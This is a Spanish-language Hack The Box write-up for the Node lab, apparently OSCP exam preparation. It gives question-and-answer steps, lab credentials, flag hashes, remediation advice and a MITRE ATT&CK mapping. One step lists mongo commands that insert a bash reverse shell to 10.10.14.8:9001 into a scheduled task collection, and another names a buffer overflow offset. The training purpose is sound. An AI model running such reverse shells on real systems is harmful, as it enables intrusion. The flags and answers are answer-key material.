# Informe Técnico de Seguridad Ofensiva: Node

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Node** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Node |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

**How many TCP ports are listening on Node?**

R: 2

![Captura de pantalla 2025-08-05 100208.png](./images/step_01.png)

**What is the relative path on the TCP port 3000 webserver that returns JSON data about the latest users on the system?**

R: /api/users/latest

![image.png](./images/step_02.png)

**What is the username of the administrator user that isn't includes in the latest users?**

R:  myP14ceAdm1nAcc0uNT

![image.png](./images/step_03.png)

**What is the myP14ceAdm1nAcc0uNT user's password on the site?**

R: manchester

![image.png](./images/step_04.png)

**What is the name of the file that comes from the "Download Backup" button?**

R: myplace.backup

![image.png](./images/step_05.png)

**What is the password for the Zip archive?**

R: magicword

![image.png](./images/step_06.png)

![image.png](./images/step_07.png)

![image.png](./images/step_08.png)

![image.png](./images/step_09.png)

**What is the database password for the mark user?**

R:5AYRft73VtFpc84k

![image.png](./images/step_10.png)

![image.png](./images/step_11.png)

**What is the full path to the JS file being run as tom (besides the web application)?**

R: /var/scheduler/app.js

![image.png](./images/step_12.png)

**What collection is the scheduler application reading from MongoDB?**

R: tasks

![image.png](./images/step_13.png)

**Submit the flag located in the tom user's home directory.**

R: 988c0c92eb2426c713557c07d718183e

```jsx
mongo -u mark -p 5AYRft73VtFpc84k --authenticationDatabase scheduler
use scheduler
db.tasks.insertOne({ cmd: "bash -i >& /dev/tcp/10.10.14.8/9001 0>&1" })

```

![image.png](./images/step_14.png)

![image.png](./images/step_15.png)

**What is the full path to the SetUID binary owned by root that's called from the web application?**

R:  /usr/local/bin/backup

![image.png](./images/step_16.png)

**How many arguments are passed to `backup` to get it to run?**

R: 3

![image.png](./images/step_17.png)

**What is the full path of the file that contains valid "magic words" to allow running `backup`?**

R:/etc/myspace/keys

![image.png](./images/step_18.png)

**If the arguments passed in are 1, 2, and 3, which number is the magic word passed in?**

R: 2

![image.png](./images/step_19.png)

**Which argument can trigger a buffer overflow vulnerability in the binary?**

R: 3

**What is the offset from the start of the data in argument three until where it overwrites EIP.**

R: 512

**Submit the flag located in the root user's home directory.**

R:a9b95b1f5dde26a7e2b79684a23db467

![image.png](./images/step_20.png)

![image.png](./images/step_21.png)

![image.png](./images/step_22.png)

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
